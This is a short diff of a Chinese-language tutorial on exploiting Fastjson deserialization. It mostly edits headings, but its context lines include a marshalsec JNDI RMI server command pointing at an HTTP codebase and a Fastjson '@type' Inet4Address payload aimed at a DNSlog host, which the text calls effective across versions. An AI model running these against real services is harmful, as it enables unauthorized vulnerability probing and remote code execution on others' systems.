@@ -102,7 +102,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 修改请求方式为 `POST`, `Content-Type 改成application/json`，并写入exp，然后发送请求。
 
 
-### **payload:**
+### **构建payload: **
 
 ```
 {
@@ -220,7 +220,9 @@ Content-Length: 137
 1. [DNSlog平台验证](http://www.dnslog.cn/)
    
 （比网上很多payload都要好用，通杀版本）
+
     payload:
+    
     ```
      {"zeo":{"@type":"java.net.Inet4Address","val":"dnslog的位置"}}
     ```
